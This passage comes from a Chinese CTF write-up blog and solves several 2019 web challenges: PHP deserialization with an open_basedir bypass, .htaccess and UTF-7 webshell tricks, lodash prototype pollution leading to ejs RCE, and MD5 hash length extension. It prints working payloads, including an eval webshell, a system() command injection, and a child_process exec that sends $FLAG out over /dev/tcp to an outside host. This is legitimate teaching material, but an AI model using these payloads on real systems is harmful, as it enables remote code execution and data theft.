$a=serialize(<span class="keyword">new</span> User);</span><br><span class="line">	$string=$_GET[<span class="string">'foo'</span>]??$a;</span><br><span class="line">	unserialize($string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>（2）看样子是一道反序列化的题目了，注释中提示了先仔细看phpinfo的内容，于是想办法先执行phpinfo()。</p>
<p>可以看到，这段代码里没有文件包含，也没有定义Welcome类，但是却在User类里实例化了Welcome类，所以应该是phpinfo中隐藏了信息。</p>
<p>所以，看phpinfo的脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">		<span class="keyword">protected</span> $careful;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;careful = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$a=<span class="keyword">new</span> Test;</span><br><span class="line">	<span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>（3）然后经过一系列操作得到第二段代码，如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"welcome&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $willing ;</span><br><span class="line">    <span class="keyword">public</span> $action ;  <span class="comment">//action=new Test;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;action=<span class="keyword">new</span> Welcome;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action-&gt;say_hello();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>整个利用过程，和QWB2019的upload那一题差不多，</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">Welcome_again =&gt; ___destruct</span><br><span class="line"><span class="keyword">Test </span>=&gt; __call</span><br><span class="line"><span class="keyword">Test </span>=&gt; __get</span><br><span class="line">eval()</span><br></pre></td></tr></table></figure>
<p>脚本如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Welcome_again</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $willing ;</span><br><span class="line">        <span class="keyword">public</span> $action ;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;action = <span class="keyword">new</span> Test();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;willing = <span class="number">1</span>;             <span class="comment">//过if判断</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;willing)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;action-&gt;say_hello(); <span class="comment">//调用Test::__call</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $careful;</span><br><span class="line">        <span class="keyword">public</span> $securuty;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;securuty = [<span class="string">'say_hello'</span> =&gt; <span class="number">1</span>];   </span><br><span class="line">            <span class="keyword">$this</span>-&gt;careful = <span class="number">0</span>;                </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;securuty[$name];        <span class="comment">//返回1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($param1,$param2)</span></span>&#123;  <span class="comment">//param1=say_hello</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$param1&#125;)&#123;                 <span class="comment">//调用Test::__get</span></span><br><span class="line">                <span class="comment">//eval('$a='.$_GET['dangerous'].';');</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> Welcome_again();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到payload:<br><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D</code></p>
<p>同时通过dangerous参数传入命令，注意要用<code>;</code>闭合前面的赋值语句。</p>
<p>（4）最后在读flag的时候好像还要bypass open_basedir。</p>
<p>可以参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">从PHP底层看open-basedir-bypass</a></p>
<p><img src="/2019/09/01/第五空间Writeup-Web/20190903163125433.png" alt="在这里插入图片描述"></p>
<p>最终payload：</p>
<p><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=1;chdir(&#39;/tmp&#39;);mkdir(&#39;sky&#39;);chdir(&#39;sky&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/var/www/flag.php&#39;));</code></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ByteCTF_2019&amp;XNUCA_2019部分web题复现</title>
    <url>/2019/09/11/ByteCTF-2019-XNUCA-2019%E9%83%A8%E5%88%86web%E9%A2%98%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="XNUCA-2019-EasyPHP"><a href="#XNUCA-2019-EasyPHP" class="headerlink" title="XNUCA 2019 EasyPHP"></a>XNUCA 2019 EasyPHP</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>1、题目给出了源码如上，大概意思就是：</p>
<ul>
<li><p>前后都有遍历删除目录下<code>index.php</code>以外的文件的代码</p>
</li>
<li><p>会包含文件<code>fl3g.php</code></p>
</li>
<li><p>接受<code>content</code>和<code>filename</code>两个参数，<code>content</code>过滤了一些关键词，<code>filename</code>只允许为<code>[a-z.]*</code></p>
</li>
<li><p>最后写入文件，文件名为<code>filename</code>，内容为<code>content</code>+<code>\nJust one chance</code> </p>
</li>
</ul>
<p>2、发现可以写入php文件但是没有办法解析，于是尝试上传<code>.htaccess</code>文件来设置解析php文件，但是会报500，因为文件结尾被添加了一行无法解析<code>Just one chance</code>内容，我们知道在<code>.htaccess</code>中只有<code>#</code>单行注释符，并没有多行注释符，但是它像大多数语言一样支持用<code>\</code>拼接上下两行，所以可以利用<code># \</code>将最后一行的内容注释掉。</p>
<p>解决了最后最后一行的问题，但是由于对于<code>content</code>内容的限制，同样没有办法直接设置解析php文件。</p>
<p>3、观察到文件中有<code>include_once(&quot;fl3g.php&quot;);</code>一句，但是实际上<code>fl3g.php</code>文件已经被删除了，所以肯定有蹊跷… 翻阅php.ini的参数可以看到这个：</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914203024986.png" alt="在这里插入图片描述"><br>这个参数可以指定一个目录列表，其中require、include、fopen()、file()、readfile()和file_get_contents()函数在查找要包含的文件时，会分别考虑include路径中的每个条目。它将检查第一个路径，如果没有找到，则检查下一个路径，直到找到包含的文件或返回警告或错误。</p>
<p>所以想办法在其他目录下写入同名<code>fl3g.php</code>文件，并且里面包含我们的shell，然后通过设置此参数，然该文件可以成功包含<code>fl3g.php</code>从而getshell。</p>
<p>4、下面就是如何在其他目录下写入文件，且文件名和内容可控，<code>filename</code>参数过滤了<code>/</code>，所以没办法直接通过<code>file_put_contents</code>函数。</p>
<p>php的配置选项中有<code>error_log</code>可以满足这一点，<code>error_log</code>可以将php运行报错的记录写到指定文件中。</p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914204129467.png" alt="在这里插入图片描述"><br>正好在文件中会包含一个不存在<code>fl3g.php</code>从而产生报错，所以我们可以把上面说的<code>include_path</code>设置为payload，这样就可以在我们指定的目录下生成文件了。</p>
<p>5、还有一点需要注意，这里写进error_log的内容会被html编码，这里可以使用utf7编码进行绕过。</p>
<p>在线编码网站：<a href="http://toolswebtop.com/text/process/encode/utf-7" target="_blank" rel="noopener">http://toolswebtop.com/text/process/encode/utf-7</a></p>
<p>6、步骤</p>
<p>（1）向<code>.htaccess</code>文件中写入如下payload，通过<code>error_log</code>配合<code>include_path</code>在tmp目录生成shell：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">php_value</span> error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting <span class="number">32767</span></span><br><span class="line">php_value include_path <span class="string">"+ADw?php eval(<span class="variable">$_GET</span>[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>
<p>（2）访问index.php文件后，再将include_path写为<code>/tmp</code>并通过utf7编码执行shell：</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">php_value include_path <span class="string">"/tmp"</span></span><br><span class="line">php_value zend.<span class="keyword">multibyte </span><span class="number">1</span></span><br><span class="line">php_value zend.<span class="keyword">script_encoding </span><span class="string">"UTF-7"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>
<h4 id="非预期解一"><a href="#非预期解一" class="headerlink" title="非预期解一"></a>非预期解一</h4><p>通过用<code>\</code>拼接上下两行来绕过过滤，从而写入被限制的内容，如下：</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">php<span class="number">_</span><span class="keyword">value</span> auto<span class="number">_p</span>repend<span class="number">_f</span>i\</span><br><span class="line">le <span class="string">".htaccess"</span></span><br></pre></td></tr></table></figure>
<p>参考<a href="http://iv4n.xyz/2019-wp/#2019xnuca" target="_blank" rel="noopener">Iv4n</a>的payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://64252b1b-326b-43dd-8dcf-e8afa7dff495.node1.buuoj.cn/'</span></span><br><span class="line">r = requests.get(url+<span class="string">'?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20".htaccess"%0AErrorDocument%20404%20"&lt;?php%20system(\'cat%20../../../fl[a]g\');?&gt;\\'</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190914221142759.png" alt="在这里插入图片描述"></p>
<h4 id="非预期解二"><a href="#非预期解二" class="headerlink" title="非预期解二"></a>非预期解二</h4><p>因为正则判断写的是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>，而不是<code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) !== 0)</code>，因此存在了被绕过的可能。 通过设置<code>.htaccess</code></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">php_value pcre<span class="selector-class">.backtrack_limit</span> <span class="number">0</span></span><br><span class="line">php_value pcre<span class="selector-class">.jit</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>导致preg_match返回False，继而绕过了正则判断，filename即可通过伪协议绕过前面stristr的判断实现Getshell。</p>
<p><br></p>
<h1 id="XNUCA-2019-HardJS"><a href="#XNUCA-2019-HardJS" class="headerlink" title="XNUCA 2019 HardJS"></a>XNUCA 2019 HardJS</h1><p>1、题目直接给了源码，进行代码审计，是一个node.js的后端，再根据题目名字，判断应该是一道原型链污染的题目，对<code>server.js</code>进行审计。</p>
<ul>
<li><code>/</code> 首页</li>
<li><code>/static</code> 静态文件</li>
<li><code>/sandbox</code> 显示用户HTML数据用的沙盒</li>
<li><code>/login</code> 登陆</li>
<li><code>/register</code> 注册</li>
<li><code>/get</code> json接口 获取数据库中保存的数据</li>
<li><code>/add</code> 用户添加数据的接口</li>
</ul>
<p>注意到下面这段代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">		···</span><br></pre></td></tr></table></figure>
<p>原型链污染的题目，对merge应该比较敏感…可以看到这里当从数据库中查找出来的数据大于5条时，将进行合并，使用的是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br></pre></td></tr></table></figure>
<p>这里正好涉及到了一个lodash库的原型链污染漏洞，即<code>CVE-2019-10744</code>，而题目中的lodash版本也正好是未修复的版本。</p>
<p>可参考：<a href="https://www.venustech.com.cn/article/1/9577.html" target="_blank" rel="noopener">https://www.venustech.com.cn/article/1/9577.html</a></p>
<p>原POC是如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
<p>我们在题目的环境下简单测试一下：<br><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/2019091515505735.png" alt="在这里插入图片描述"></p>
<p>发现原型链污染可以成功，下面就是寻找可利用的点来进行RCE。</p>
<p>此题使用使用ejs库作为模版引擎了，看一下<code>ejs.js</code>，发现从572行开始进行了大量的js代码拼接，关键部分如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.source) &#123;</span><br><span class="line">  <span class="keyword">this</span>.generateSource();</span><br><span class="line">  prepended += <span class="string">'  var __output = [], __append = __output.push.bind(__output);'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  <span class="keyword">if</span> (opts.outputFunctionName) &#123;</span><br><span class="line">    prepended += <span class="string">'  var '</span> + opts.outputFunctionName + <span class="string">' = __append;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (opts._with !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">'  with ('</span> + opts.localsName + <span class="string">' || &#123;&#125;) &#123;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">    appended += <span class="string">'  &#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  appended += <span class="string">'  return __output.join("");'</span> + <span class="string">'\n'</span>;</span><br><span class="line">  <span class="keyword">this</span>.source = prepended + <span class="keyword">this</span>.source + appended;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (opts.compileDebug) &#123;</span><br><span class="line">  src = <span class="string">'var __line = 1'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  , __lines = '</span> + <span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.templateText) + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  , __filename = '</span> + (opts.filename ?</span><br><span class="line">    <span class="built_in">JSON</span>.stringify(opts.filename) : <span class="string">'undefined'</span>) + <span class="string">';'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'try &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="keyword">this</span>.source</span><br><span class="line">    + <span class="string">'&#125; catch (e) &#123;'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'  rethrow(e, __lines, __filename, __line, escapeFn);'</span> + <span class="string">'\n'</span></span><br><span class="line">    + <span class="string">'&#125;'</span> + <span class="string">'\n'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  src = <span class="keyword">this</span>.source;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到当<code>opts</code>存在属性<code>outputFunctionName</code>时，便会被直接拼接到<code>prepended</code>这段js代码中，然后再拼接到<code>this.source</code>，最后再拼接到<code>src</code>中。</p>
<p>我们跟进一下这段代码最后执行的地方：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (opts.async) &#123;</span><br><span class="line">        <span class="comment">// Have to use generated function for this, since in envs without support,</span></span><br><span class="line">        <span class="comment">// it breaks in parsing</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          ctor = (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'return (async function()&#123;&#125;).constructor;'</span>))();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">          <span class="keyword">if</span> (e <span class="keyword">instanceof</span> <span class="built_in">SyntaxError</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'This environment does not support async/await'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        ctor = <span class="built_in">Function</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fn = <span class="keyword">new</span> ctor(opts.localsName + <span class="string">', escapeFn, include, rethrow'</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">		</span><br><span class="line">	···</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> (opts.client) &#123;</span><br><span class="line">      fn.dependencies = <span class="keyword">this</span>.dependencies;</span><br><span class="line">      <span class="keyword">return</span> fn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>最后生成了一个动态的函数，然后以<code>returned fn</code>返回并被执行。</p>
<p>所以我们的思路就是覆盖<code>opts.outputFunctionName</code>，这样我们构造的payload就会被拼接进js语句中，并在ejs渲染时进行RCE。</p>
<p>关于payload的构造，可参考这篇文章：<a href="http://f1sh.site/2019/04/17/node-js-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-cve-2017-16082-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">node-js-学习笔记</a></p>
<p><img src="/2019/09/11/ByteCTF-2019-XNUCA-2019部分web题复现/20190915162710452.png" alt="在这里插入图片描述"><br>最终payload如下：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"wiki"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"a=1;process.mainModule.require('child_process').exec('bash -c \"echo $FLAG&gt;/dev/tcp/xxxxx/xxx\"')//"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>将Content-Type改为json，发包6次触发合并操作，污染原型链，再次访问即可。</p>
<p><br></p>
<h1 id="ByteCTF-2019-EzCMS"><a href="#ByteCTF-2019-EzCMS" class="headerlink" title="ByteCTF_2019 EzCMS"></a>ByteCTF_2019 EzCMS</h1><p>1、扫描目录有<code>www.zip</code>，下载得到源码。</p>
<p>整个题目的功能如下：</p>
<ul>
<li><code>index.php</code>页面验证登陆，可以任意账号登陆到<code>upload.php</code>上传页面，但是只有admin账号才能进行文件上传。</li>
<li>访问了<code>upload.php·</code>，就会在沙盒下生成一个<code>.htaccess</code>文件，内容为：<code>lolololol, i control all</code>。</li>
<li>上传文件后，会返回文件的存储路径，view details可以进入<code>view.php</code>，会回显文件的mime类型以及文件路径。</li>
<li>因为目录下的<code>.htaccess</code>被写入了内容，无法解析，所以访问上传的文件会报500。</li>
</ul>
<p>2、只有admin才能上传文件，验证登陆的部分如下，显然是利用hash长度扩展登陆admin账户。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    setcookie(<span class="string">"hash"</span>, md5($secret.<span class="string">"adminadmin"</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $secret = <span class="string">"********"</span>;</span><br><span class="line">    $username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">"admin"</span> &amp;&amp; $password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.$username.$password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>密钥长度为8，先随意登陆得到已知hash为52107b08c0f3342d2153ae1d68e6262c，利用hashpump：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">Input Signature: <span class="number">52107</span>b<span class="number">08</span><span class="keyword">c</span><span class="number">0</span>f<span class="number">3342</span>d<span class="number">2153</span>ae<span class="number">1</span>d<span class="number">68e6262</span><span class="keyword">c</span></span><br><span class="line">Input Data: admin</span><br><span class="line">Input Key Length: <span class="number">13</span></span><br><span class="line">Input Data <span class="keyword">to</span> Add: Lethe</span><br><span class="line">ec<span class="number">1</span>b<span class="number">7</span><span class="keyword">c</span><span class="number">99078</span>d<span class="number">6</span>f<span class="number">2</span>be<span class="number">7</span><span class="keyword">c</span><span class="number">25481</span>b<span class="number">53</span>bad<span class="number">40</span></span><br><span class="line">admin\<span class="keyword">x</span><span class="number">80</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span 